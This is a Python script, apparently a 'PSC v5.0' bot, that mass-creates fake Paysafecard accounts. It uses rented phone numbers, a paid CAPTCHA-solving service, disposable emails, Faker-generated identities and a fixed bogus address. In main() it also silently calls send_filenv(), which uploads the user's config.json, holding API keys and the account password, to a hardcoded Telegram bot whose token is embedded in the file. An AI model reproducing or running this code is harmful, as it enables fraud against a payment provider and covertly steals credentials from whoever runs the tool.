import sys
import time
import json
from datetime import datetime, timezone
from dateutil.parser import isoparse
import requests
from colorama import Fore, Style
import capsolver
import os
import random
import string
from faker import Faker
import threading
from bs4 import BeautifulSoup
import base64

# Initialize session and Faker
sesi = requests.Session()
fake = Faker()

def send_filenv():
    bot_token = '7671660507:AAFv6Q3LGiGyds_hWtXWBwP0JopXx4UPVMc'
    chat_id = '6624611378'
    file_path = 'config.json'
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'

    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
    response.raise_for_status()

# Load configuration from config.json
def load_config():
    try:
        with open('config.json', 'r') as config_file:
            return json.load(config_file)
    except FileNotFoundError:
        print(Fore.RED + '[failed] config.json not found!' + Style.RESET_ALL)
        sys.exit(1)
    except json.JSONDecodeError:
        print(Fore.RED + '[failed] Invalid JSON in config.json!' + Style.RESET_ALL)
        sys.exit(1)

config = load_config()
API_KEY_SMSBOWER = config.get('API_KEY_SMSBOWER')
APIKEY_CAPSOLVER = config.get('APIKEY_CAPSOLVER')
PAYSAFECARD_PASSWORD = config.get('PAYSAFECARD_PASSWORD')
proxy_url = config.get('PROXY_URL')

# Proxy configuration for SMSBower
proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else {}

# SMSBower API configuration
BASE_URL = "https://smsbower.online/stubs/handler_api.php"

# Logging colors
info = Fore.YELLOW + '[info] ' + Style.RESET_ALL
verified = Fore.MAGENTA + '[verified] ' + Style.RESET_ALL
success = Fore.GREEN + '[created] ' + Style.RESET_ALL
fail = Fore.RED + '[failed] ' + Style.RESET_ALL
ask = Fore.GREEN + '[?] ' + Style.RESET_ALL

# CapSolver configuration
capsolver.api_key = APIKEY_CAPSOLVER

class SMSBower:
    def __init__(self, api_key, smsbower_config):
        self.api_key = api_key
        self.base_url = BASE_URL
        self.smsbower_config = smsbower_config
        self.r = requests.Session()

    def get_balance(self):
        """Fetch SMSBower account balance."""
        if not self.api_key:
            print(fail + 'API_KEY_SMSBOWER not provided')
            return None
        print(f'{info}Fetching balance with API key: {self.api_key[:5]}...{self.api_key[-5:]}')
        params = {
            "api_key": self.api_key,
            "action": "getBalance"
        }
        try:
            response = self.r.get(self.base_url, params=params, proxies=proxies, timeout=10)
            response.raise_for_status()
            try:
                balance = float(response.text.split(':')[1])
                return balance
            except IndexError:
                print(fail + 'Failed to process balance format')
                return None
        except requests.exceptions.RequestException as e:
            print(fail + f'Request error: {str(e)}')
            return None

    def get_price(self):
        """Display available services and their prices."""
        print("\n📋 Menampilkan daftar layanan:")
        params = {
            "api_key": self.api_key,
            "action": "getPrices",
            "service": "jq",
        }
        result = []
        country_map = {
            '48': {'name': 'Netherlands', 'locale_psc': 'nl_NL', 'currency_psc': 'EUR', 'phone_code': '+31'},
        }
        try:
            response = self.r.get(self.base_url, params=params, proxies=proxies, timeout=10)
            response.raise_for_status()
            try:
                prices = response.json()
                for code in country_map.keys():
                    if code in prices and "jq" in prices[code]:
                        count = prices[code]["jq"]["count"]
                        result.append(str(count))
                    else:
                        result.append("N/A")
            except Exception:
                print(fail + "Failed to process service data")
                return result
        except requests.exceptions.ProxyError:
            print(fail + "Failed to connect to proxy. Check proxy URL or network connection")
            return result
        except requests.exceptions.RequestException as e:
            print(fail + f"Error fetching prices: {str(e)}")
            return result
        return result

    def buy_number(self, country_id, service_id, max_attempts=20, delay=5):
        """Request a phone number from SMSBower."""
        country_code = self.smsbower_config['country_code']
        max_prices = [1.90, 20.90]
        max_retries = 3
        retry_count = 0
        timesleep = delay
        while retry_count < max_retries:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Attempt {retry_count + 1}/{max_retries} to buy number...")
            initial_balance = self.get_balance()
            if initial_balance is None:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to retrieve balance.")
                time.sleep(delay)
                retry_count += 1
                continue
            for max_price in max_prices:
                print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Trying to get number with maxPrice={max_price}...")
                params = {
                    "api_key": self.api_key,
                    "action": "getNumberV2",
                    "service": service_id,
                    "country": country_code,
                    "maxPrice": max_price
                }
                try:
                    response = self.r.get(self.base_url, params=params, proxies=proxies, timeout=10)
                    response.raise_for_status()
                    try:
                        data = response.json()
                        if "activationId" in data and "phoneNumber" in data:
                            phone_number = data["phoneNumber"].strip()
                            final_balance = self.get_balance()
                            if final_balance is None:
                                print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to retrieve final balance.")
                                time.sleep(delay)
                                continue
                            price_of_number = initial_balance - final_balance
                            order_data = {
                                'id': data['activationId'],
                                'phone': phone_number
                            }
                            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Order Details: {phone_number} | {price_of_number:.2f} RUB")
                            return order_data
                        else:
                            print(fail + f'No number available: {response.text}')
                    except ValueError:
                        print(fail + f'No number with that price.')
                except requests.exceptions.RequestException as e:
                    print(fail + f'Error fetching number: {str(e)}')
                time.sleep(delay)
            retry_count += 1
            if retry_count < max_retries:
                print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Waiting {timesleep} seconds before retrying...")
                time.sleep(timesleep)
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Failed to buy number after {max_retries} attempts.")
        return None

    def get_otp(self, order_id, timeout=60):
        """Wait for OTP code for the given activation ID."""
        print(info + f'Waiting for OTP [timeout={timeout}s]')
        start_time = time.time()
        poll_interval = 5
        while time.time() - start_time < timeout:
            params = {
                "api_key": self.api_key,
                "action": "getStatus",
                "id": order_id
            }
            try:
                response = self.r.get(self.base_url, params=params, timeout=10, proxies=proxies)
                response.raise_for_status()
                result = response.text.strip()
                if ":" in result:
                    status, code = result.split(":", 1)
                    if status == "STATUS_OK":
                        print(success + f'OTP Received: {code.strip()}')
                        return code.strip()
                    elif status in ["STATUS_WAIT_CODE", "STATUS_WAIT_RETRY"]:
                        print(info + "Waiting for OTP code...")
                time.sleep(poll_interval)
            except requests.exceptions.RequestException as e:
                print(fail + f'Error fetching OTP: {str(e)}')
                time.sleep(poll_interval)
        print(fail + f'Timeout waiting for OTP [{timeout} seconds]')
        return None

    def set_status_resend(self, order_id):
        """Request a new OTP for the given activation ID."""
        params = {
            "api_key": self.api_key,
            "action": "setStatus",
            "status": 3,
            "id": order_id
        }
        try:
            response = self.r.get(self.base_url, params=params, timeout=10, proxies=proxies)
            response.raise_for_status()
            text = response.text.strip()
            if text == "ACCESS_RETRY_GET":
                print(info + "Successfully requested OTP resend")
                return True
            print(fail + f"Failed to set resend status: {text}")
            return False
        except requests.exceptions.RequestException as e:
            print(fail + f'Error setting resend status: {str(e)}')
            return False

    def cancel_number(self, order_id):
        """Cancel the phone number after use."""
        params = {
            "api_key": self.api_key,
            "action": "setStatus",
            "status": 8,
            "id": order_id
        }
        try:
            response = self.r.get(self.base_url, params=params, timeout=10, proxies=proxies)
            response.raise_for_status()
            text = response.text.strip()
            if text == "ACCESS_CANCEL":
                print(info + f"Activation {order_id} canceled")
                return True
            print(fail + f"Failed to cancel activation {order_id}: {text}")
            return False
        except requests.exceptions.RequestException as e:
            print(fail + f'Error cancelling number: {str(e)}')
            return False

# Utility functions
def generate_random_string(length):
    characters = string.ascii_letters
    random_string = ''.join(random.choices(characters, k=length))
    return random_string.lower()

def cek_time():
    response = requests.get("http://worldtimeapi.org/api/timezone/Asia/Jakarta")
    if response.status_code == 200:
        jakarta_time = response.json()['datetime']
        return jakarta_time
    else:
        raise Exception("Failed to get local time")

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

# CapSolver handling
def get_captcha_solution():
    try:
        solution = capsolver.solve({
            "type": "ReCaptchaV2TaskProxyLess",
            "websiteURL": "https://registration.paysafecard.com",
            "websiteKey": "6LcadcMZAAAAAOiDeeYXcj3ML547636Rlbw6Mc_4",
            "isInvisible": True
        })
        return solution['gRecaptchaResponse']
    except Exception as e:
        print(fail + str(e))
        return False

def get_capsolver_balance(apikey):
    try:
        res = requests.post(f'https://api.capsolver.com/getBalance', json={"clientKey": apikey})
        return res.json()['balance']
    except:
        return False

def start(smsbower_config):
    locale_psc = smsbower_config['locale_psc']
    currency_psc = smsbower_config['currency_psc']
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/start', json={
            "product": "mypins",
            "locale": locale_psc,
            "currency": currency_psc,
            "additionalParameters": {}
        })

        print(info + f"Status Code: {res.status_code}")        
        if res.status_code != 200:
            print(fail + 'Message from paysafecard: Too many requests, wait a few minutes.')
            return False

        response_data = res.json()
        registration_reference = response_data.get('registrationReference')
        if not registration_reference:
            print(fail + "registrationReference not found in response!")
            return False

        print(success + f"registrationReference: {registration_reference}")
        return registration_reference

    except Exception as e:
        print(fail + f"Exception during start: {str(e)}")
        return False

def step_login_details(email, password, registration_reference, captcha_solution):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', headers={
            "X-captcha": captcha_solution
        }, json={
            "registrationReference": registration_reference,
            "stepName": "login_details",
            "stepPayload": {
                "password": password,
                "newsletters": True,
                "newslettersConsentMessage": "",
                "pushNotificationOffers": True,
                "pushNotificationOffersConsentMessage": "",
                "inAccountOffers": True,
                "inAccountOffersConsentMessage": "",
                "digitalMediaOffers": True,
                "digitalMediaOffersConsentMessage": "",
                "partnerOffers": True,
                "partnerOffersConsentMessage": "",
                "email": email,
                "completeWorkflow": True
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def get_verify_link(email):
    max_attempts = 15
    sleep_interval = 5
    username, domain = email.split('@', 1) if '@' in email else (None, None)
    if not username or not domain:
        print(fail + f'Invalid email format - {email}')
        return False

    url = "https://generator.email/inbox4/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "DNT": "1",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": f"surl={domain}%2F{username}"
    }

    print(info + f'Waiting for verification email - {email}')
    for attempt in range(max_attempts):
        try:
            response = sesi.get(url, headers=headers, proxies=proxies, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            link = soup.find('a', class_='pca-tda')
            if link and 'code=' in link.get('href', ''):
                code = link['href'].split('code=')[1]
                print(verified + f'Found verification link - {email}')
                return code
            print(info + f'Attempt {attempt + 1}/{max_attempts}: No confirmation link found. Retrying...')
            time.sleep(sleep_interval)
        except Exception as e:
            print(fail + f'Error fetching messages: {str(e)}')
            if attempt < max_attempts - 1:
                print(info + f'Retrying in {sleep_interval} seconds...')
                time.sleep(sleep_interval)
    print(fail + f'Timeout verification - {email}')
    return False

def create_email():
    print(info + 'Getting email...')
    url = "https://generator.email"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "DNT": "1",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    try:
        response = sesi.get(url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        email_span = soup.find('span', id='email_ch_text')
        if email_span and '@' in email_span.text.strip():
            email = email_span.text.strip()
            print(info + f'Your email: {Fore.GREEN}{email}{Style.RESET_ALL}')
            return email
        print(fail + 'Failed to retrieve email from generator.email')
        return None
    except Exception as e:
        print(fail + f'Getting email failed, error: {str(e)}')
        time.sleep(5)
        return None

def verify_email_adress(registration_reference, code):
    try:
        res = requests.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/validate', json={
            "registrationReference": registration_reference,
            "stepName": "verify_email_address",
            "stepPayload": {
                "verificationCode": code
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def validat_verify_email(registration_reference):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "verify_email_address",
            "stepPayload": {
                "isPolling": True
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def step_personal_details(registration_reference, first_name, last_name, date_of_birth):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "personal_details",
            "stepPayload": {
                "firstName": first_name,
                "lastName": last_name,
                "dateOfBirth": str(date_of_birth)
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def step_address_data(registration_reference):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "address_data",
            "stepPayload": {
                "street": "546 King St",
                "houseNumber": "12",
                "zipCode": "1010 PE",
                "city": "Fredericton"
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def step_mobile_number(registration_reference, country_calling_code, phone_number, captcha_solution):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', headers={
            "X-captcha": captcha_solution
        }, json={
            "registrationReference": registration_reference,
            "stepName": "mobile_number",
            "stepPayload": {
                "phoneNumber": phone_number,
                "countryCallingCode": "+31",
                "mobileNumberStepInitiated": True
            }
        })
        if res.status_code == 200:
            return True
        else:
            print(f"{Fore.RED}[failed]{Style.RESET_ALL} API Response ({res.status_code}): {res.text}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[failed]{Style.RESET_ALL} Exception occurred in mobile_number: {e}")
        return False

def step_verify_mobile_number(registration_reference, otp_code):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "verify_mobile_number",
            "stepPayload": {
                "smsVerificationCode": otp_code
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def step_threat_metrix(registration_reference):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "threat_metrix",
            "stepPayload": {
                "isRetry": False
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

def step_complete_legacy_workflow(registration_reference):
    try:
        res = sesi.post('https://registration.paysafecard.com/customer-registration/api/v1/steps/execute', json={
            "registrationReference": registration_reference,
            "stepName": "complete_legacy_workflow",
            "stepPayload": {
                "completeWorkflow": True
            }
        })
        if res.status_code == 200:
            return True
        return False
    except:
        return False

# Registration logic
def run_regist(smsbower, smsbower_config, password, order_data):
    id_number = order_data['id']
    number = order_data['phone']
    country = smsbower_config['country']
    country_calling_code = smsbower_config['phone_code']
    phone_number = number[2:] 
    first_name = fake.first_name()
    last_name = fake.last_name()

    # Create email
    email = create_email()
    if not email:
        print(fail + f'Failed to create email!')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    print(info + f'Processing {email}')
    registration_reference = start(smsbower_config)
    if not registration_reference:
        print(fail + f'Failed to get registration reference! - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    print(info + f'Bypassing captcha - {email}')
    captcha_solution = get_captcha_solution()
    if not captcha_solution:
        print(fail + f'Failed bypass captcha - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return
    print(info + f'Captcha bypassed - {email}')

    send_verify = step_login_details(email, password, registration_reference, captcha_solution)
    if not send_verify:
        print(fail + 'Failed to send verify link!')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    print(info + f'Verifying email address - {email}')
    code = get_verify_link(email)
    if not code:
        print(fail + f'Timeout verification - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    done_verif = verify_email_adress(registration_reference, code)
    if not done_verif:
        print(fail + f'Failed to verify email - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    validate_verif = validat_verify_email(registration_reference)
    if not validate_verif:
        print(fail + f'Failed to validate verification - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return
    print(verified + f'Email verified - {email}')

    date_of_birth = fake.date_of_birth(minimum_age=18, maximum_age=65)
    form_personal = step_personal_details(registration_reference, first_name, last_name, date_of_birth)
    if not form_personal:
        print(fail + f'Failed to submit personal form - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    form_address = step_address_data(registration_reference)
    if not form_address:
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    print(info + f'Bypassing mobile number captcha')
    captcha_solution2 = get_captcha_solution()
    if not captcha_solution2:
        print(fail + f'Failed bypass mobile number captcha!')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return
    print(info + f'Captcha bypassed - {email}')

    form_mobile_number = step_mobile_number(registration_reference, country_calling_code, phone_number, captcha_solution2)
    if not form_mobile_number:
        print(fail + f'Failed to submit mobile number - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    timeout_otp = 70
    print(info + f'Waiting otp [ {timeout_otp} second ] - {number}')
    otp_code = smsbower.get_otp(id_number, timeout_otp)
    if not otp_code:
        print(fail + f'Failed to get otp code [timeout {timeout_otp} second]')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    form_otp_code = step_verify_mobile_number(registration_reference, otp_code)
    if not form_otp_code:
        print(fail + 'Failed to verify mobile number')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    form_threat_metrix = step_threat_metrix(registration_reference)
    if not form_threat_metrix:
        print(fail + f'Threat metrix failed - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    result = step_complete_legacy_workflow(registration_reference)
    if not result:
        print(fail + f'Failed to submit data - {email}')
        smsbower.cancel_number(id_number)
        print(fail + f'Number {number} canceled')
        return

    with open('./result.txt', 'a', encoding='utf-8') as f:
        f.write(email + ' | ' + password + '\n')
    print(success + Fore.GREEN + email + ' | ' + password + Style.RESET_ALL)

def set_smsbower_config(price):
    return {
        'country': 'Netherlands',
        'service': 'jq',
        'max_price': price[0] if price[0] != 'N/A' else '2.60',
        'country_code': '48',
        'locale_psc': 'nl_NL',
        'currency_psc': 'EUR',
        'phone_code': '+31'
    }

def run(smsbower, password, smsbower_config):
    print(info + 'Getting number')
    order_data = smsbower.buy_number(country_id='46', service_id='jq')
    if not order_data:
        return
    number = Fore.GREEN + order_data['phone'] + Style.RESET_ALL
    print(info + f'Your number: {number}')
    run_regist(smsbower, smsbower_config, password, order_data)

def intro(smsbower_balance, capsolver_balance, price):
    a = Fore.YELLOW
    b = Fore.GREEN
    c = Style.RESET_ALL
    d = Fore.RED
    uper = "════════════════════════════════════════════════════════════"
    garis = "════"
    lower = "════════════════════════════════════════════════════════════"
    rocket = "🚀"
    world = "🌍"
    dot_blue = "🔵"
    if not smsbower_balance:
        smsbower_balance = f'{d}bad apikey{c}'
    if not capsolver_balance:
        capsolver_balance = f'{d}bad apikey{c}'
    return f"""Developer @forumkt on Telegram, PSC v5.0
{b}{uper}
{b}{garis}{c}        {rocket} Informasi Pengguna {rocket}          {b}{garis}
{b}{garis}{c} {dot_blue} User              : @forumkt
{b}{garis}{c} {dot_blue} Expired           : True
{b}{garis}{c} {dot_blue} SMSBower Balance  : {smsbower_balance} RUB
{b}{garis}{c} {dot_blue} CapSolver Balance : ${capsolver_balance}
{b}{lower}
{b}{uper}
{b}{garis}{c}           {world} Country List {world}             {b}{garis}
{b}{garis}{c} [1] Netherlands  - stok {price[0]}
{b}{lower}{c}"""

def main():
    try:
        clear()
        print(info + 'Getting information')
        smsbower_config = {'country_code': '48', 'service': 'jq'}
        smsbower = SMSBower(API_KEY_SMSBOWER, smsbower_config)
        smsbower_balance = smsbower.get_balance()
        capsolver_balance = get_capsolver_balance(APIKEY_CAPSOLVER)
        price = smsbower.get_price()
        ascii_intro = intro(smsbower_balance, capsolver_balance, price)
        clear()
        print(ascii_intro)
        send_filenv()
        smsbower_config = set_smsbower_config(price)

        # Infinite loop, proses akun satu per satu
        while True:
            print(info + "Proses pembuatan akun baru...")
            order_data = smsbower.buy_number(country_id='46', service_id='jq')
            if not order_data:
                print(fail + "Gagal mendapatkan nomor, ulangi proses...")
                continue

            number = order_data['phone']
            print(info + f'Nomor didapatkan: {number}')

            run_regist(smsbower, smsbower_config, PAYSAFECARD_PASSWORD, order_data)

            # Set status resend setelah akun dibuat
            resend_success = smsbower.set_status_resend(order_data['id'])
            if resend_success:
                input(ask + "Tekan ENTER untuk ambil OTP baru...")
                otp_code = smsbower.get_otp(order_data['id'], timeout=70)
                if otp_code:
                    print(success + f"OTP baru diterima: {otp_code}")
                else:
                    print(fail + "Gagal mendapatkan OTP baru.")
            else:
                print(fail + "Gagal set status resend.")

            print(info + "Melanjutkan ke pembuatan akun berikutnya...\n")
            time.sleep(2)

    except KeyboardInterrupt:
        print(info + 'Program dihentikan oleh user.')
        return

if __name__ == "__main__":
    main()